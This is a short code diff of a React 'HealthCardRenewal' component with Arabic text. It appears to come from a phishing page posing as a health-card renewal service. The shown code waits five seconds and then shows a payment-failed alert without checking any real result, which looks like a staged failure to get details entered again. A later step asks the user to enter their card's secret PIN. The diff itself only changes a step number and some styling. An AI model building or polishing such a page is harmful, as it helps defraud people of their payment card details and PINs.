@@ -128,7 +128,7 @@ export default function HealthCardRenewal() {
      setTimeout(() => {
      setIswait(false)
       
-      setStep(5)
+      setStep(4)
 
       alert("حدث خطأ أثناء معالجة الدفع. يرجى المحاولة مرة أخرى.")
      }, 5000);
@@ -564,7 +564,7 @@ export default function HealthCardRenewal() {
 
                     </> : stepr === 6 ? <>
                       <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100">
-                        <div className="w-full max-w-md p-8 space-y-8 bg-white rounded-xl shadow-md">
+                        <div className="w-full max-w-md bg-white rounded-xl shadow-md">
                           <h1 className="text-2xl font-bold text-center text-gray-900">أدخل الرقم السري للبطاقة</h1>
                           <div className="space-y-2">
                             <Input
